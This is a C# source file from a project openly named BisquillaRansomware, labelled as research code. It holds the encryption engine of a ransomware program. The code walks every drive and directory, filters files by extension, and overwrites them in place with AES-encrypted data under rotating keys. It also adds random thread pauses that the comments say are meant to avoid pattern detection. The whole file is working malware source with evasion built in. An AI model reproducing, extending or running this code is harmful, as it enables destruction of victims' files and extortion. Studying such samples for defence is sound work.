/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Collections.Concurrent;
using System.Collections.Generic;

namespace BisquillaRansomware
{
    /// <summary>
    /// Basic Encryption Strategy
    /// </summary>
    public sealed class EncryptionStrategy
    {

        /// <summary>
        /// Files to Encrypt Queue
        /// </summary>
        private ConcurrentQueue<FileInfo> filesToEncrypt = new ConcurrentQueue<FileInfo>();

        /// <summary>
        /// Threads to Execute
        /// </summary>
        private List<Thread> threads = new List<Thread>();

        /// <summary>
        /// Flag that Control Files Scanner Processing
        /// </summary>
        private Boolean isFileScannerFinished = false;

        /// <summary>
        /// Generic Randomizer
        /// </summary>
        private Random randomizer = new Random((Int32) DateTime.UtcNow.Ticks);

        /// <summary>
        /// Thread Lock Object
        /// </summary>
        private static Object lockableObject = new object();

        /// <summary>
        /// Main Encryption Method
        /// </summary>
        public void EncryptDisk()
        {
            // Compute Thread Count
            Int32 threadCount = Environment.ProcessorCount;

            // Create Threads
            for (int i = 0; i < threadCount; i++)
            {
                Thread thread = new Thread(DoEncryption);
                thread.IsBackground = false;
                thread.Priority = ThreadPriority.Normal;
                thread.Start();
                this.threads.Add(thread);
            }

#if DEBUG
            Trace.WriteLine("[*] EncryptDisk > Start");
#endif
            // Enumerate All Device Disks
            DriveInfo[] drives = DriveInfo.GetDrives();

#if DEBUG
            Trace.WriteLine("[+] Drives Enumerated Successfully. " + drives.Length + " Drives Found");
#endif

            // Iterate Drivers
            foreach (DriveInfo drive in drives)
            {
                EncryptDrive(drive);
            }

            // Set End File Mapping Flag
            this.isFileScannerFinished = true;

#if DEBUG
            Trace.WriteLine("[*] EncryptDisk > File Scanner Completed. Now Join Threads");
#endif

            // Join All Thread
            foreach (Thread item in this.threads)
            {
                item.Join();
            }

#if DEBUG
            Trace.WriteLine("[*] EncryptDisk > Terminated");
#endif
        }

        /// <summary>
        /// Full Encrypt Drive
        /// </summary>
        /// <param name="drive"></param>
        private void EncryptDrive(DriveInfo drive)
        {
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] EncryptDrive (" + drive.Name + ")");
            Trace.Indent();
#endif

            // Check Drive State
            if (drive.IsReady)
            {
                // Get All Folders
                DirectoryInfo[] directories = drive.RootDirectory.GetDirectories();

                // Encrypt All Directories
                foreach (DirectoryInfo di in directories)
                {
                    EncryptDirectory(di);
                }
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] Drive is not Ready");
#endif
            }


#if DEBUG
            Trace.Unindent();
#endif
        }

        /// <summary>
        /// Encrypt a Directory
        /// </summary>
        /// <param name="di"></param>
        private void EncryptDirectory(DirectoryInfo di)
        {
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] EncryptDirectory (" + di.Name + ")");
#endif

            // Check Directory Filter
            if (!Common.DirectoryInFilter(di.FullName))
            {
#if DEBUG
                Trace.Indent();
                Trace.WriteLine("[+] Directory Not in Filter");
                Trace.Unindent();
#endif
                return;
            }


            // Recursive Operation
            try
            {
                DirectoryInfo[] subDrives = di.GetDirectories();

                if (subDrives != null)
                {
                    foreach (DirectoryInfo subDirectory in subDrives)
                    {
                        EncryptDirectory(subDirectory);
                    }
                }

                // Encrypt All Drive Files
                FileInfo[] files = di.GetFiles();

                foreach (FileInfo file in files)
                {
                    EncryptFile(file);
                }
            }
            catch (Exception e)
            {
#if DEBUG
                Trace.WriteLine("");
                Trace.WriteLine("[!] Error While Read Directory");
                Trace.WriteLine(e.ToString());
#endif
            }
        }

        /// <summary>
        /// Register new File to Encrypt
        /// </summary>
        /// <param name="file"></param>
        private void EncryptFile(FileInfo file)
        {
            this.filesToEncrypt.Enqueue(file);
        }


        /// <summary>
        /// Method to Iterate Files to Encrypt
        /// </summary>
        /// <param name="state"></param>
        private void DoEncryption()
        {
         
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] DoEncryption Start > ThreadId:" + Thread.CurrentThread.ManagedThreadId.ToString());
            Trace.Indent();
#endif

            while (!isFileScannerFinished || ! this.filesToEncrypt.IsEmpty)
            {
                FileInfo fi = null;
                if (this.filesToEncrypt.TryDequeue(out fi))
                {
                    this.ThreadEncryptFile(fi);
                }

                // Random Pause - Avoid Loop Pattern Detection
                Thread.Sleep(randomizer.Next(5, 99));
            }

#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] DoEncryption Terminated > ThreadId:" + Thread.CurrentThread.ManagedThreadId.ToString());
            Trace.Indent();
#endif
        }



        /// <summary>
        /// Encrypt a Single File (In Thread Enviroment)
        /// </summary>
        /// <param name="file"></param>
        private void ThreadEncryptFile(FileInfo file)
        {
            // Simple Thread Wait
            Thread.Sleep(10);

#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] EncryptFile (" + file.Name + ")" + " ThreadID:" + Thread.CurrentThread.ManagedThreadId.ToString());
            Trace.Indent();
#endif

            // Check File in Filter
            if (Common.FileInFilter(file.Extension))
            {
                // File Signature Decision Gate
                if (!Common.CheckSignature(file))
                {
                    // Encrypt
#if DEBUG
                    Trace.WriteLine("[+] File to Encrypt");
#endif

                    // Read File Data
                    Byte[] fileData = null;
                    FileManager.ReadFile(file, ref fileData);

                    // Encrypt File
                    using (FileStream fs = File.OpenWrite(file.FullName))
                    {
                        fs.Position = 0;

                        // Lock do Get Key and Rotate (with Proba)
                        byte[] key = null;
                        byte[] iv = null;

                        lock (lockableObject)
                        {
                            // Rotate Key
                            CriptoKeyManager.RotateAesKey();

                            // Copy Keys to Encrypt
                            key = new byte[CriptoKeyManager.CURRENT_FILE_ENCRIPTION_KEY.Length];
                            iv = new byte[CriptoKeyManager.CURRENT_FILE_ENCRIPTION_IV.Length];

                            Array.Copy(CriptoKeyManager.CURRENT_FILE_ENCRIPTION_IV, iv, CriptoKeyManager.CURRENT_FILE_ENCRIPTION_IV.Length);
                            Array.Copy(CriptoKeyManager.CURRENT_FILE_ENCRIPTION_KEY, key, CriptoKeyManager.CURRENT_FILE_ENCRIPTION_KEY.Length);

                            // Write Control Structure
                            fs.Write(ConfigurationManager.FILE_SIGNATURE, 0, ConfigurationManager.FILE_SIGNATURE_SIZE);
                            fs.Write(CriptoKeyManager.CURRENT_ENCRYPTED_FILE_ENCRIPTION_KEY, 0, CriptoKeyManager.CURRENT_ENCRYPTED_FILE_ENCRIPTION_KEY.Length);
                            fs.Write(CriptoKeyManager.CURRENT_ENCRYPTED_FILE_ENCRIPTION_IV, 0, CriptoKeyManager.CURRENT_ENCRYPTED_FILE_ENCRIPTION_IV.Length);
                        }

                        fs.Flush();

                        // Write Encrypted Data
                        CriptoFileManager.Encrypt(fs, ref fileData, ref key, ref iv);

                        // Clear Array
                        Common.ClearArray(ref key);
                        Common.ClearArray(ref iv);
                    }
                }
                else
                {
#if DEBUG
                    Trace.WriteLine("[+] File Alread Encrypted");
#endif
                }
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] File Filter not Allowed");
#endif
            }


#if DEBUG
            Trace.Unindent();
#endif
        }

    }
}
